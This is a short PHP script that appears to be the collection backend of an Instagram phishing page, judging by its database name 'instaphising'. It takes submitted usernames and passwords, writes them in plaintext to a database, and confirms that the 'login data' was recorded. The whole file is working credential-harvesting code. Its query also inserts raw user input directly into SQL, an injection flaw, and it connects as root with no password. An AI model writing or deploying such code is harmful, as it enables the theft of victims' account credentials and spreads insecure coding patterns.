<?php
// Connect to the database
$conn = new mysqli('localhost', 'root', '', 'instaphising');

// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// Get user inputs
$username = $_POST['username'];
$password = $_POST['password'];

// Save data to the database
$sql = "INSERT INTO users (username, password) VALUES ('$username', '$password')";
if ($conn->query($sql) === TRUE) {
    echo "Login data recorded successfully!";
} else {
    echo "Error: " . $sql . "<br>" . $conn->error;
}

$conn->close();
?>
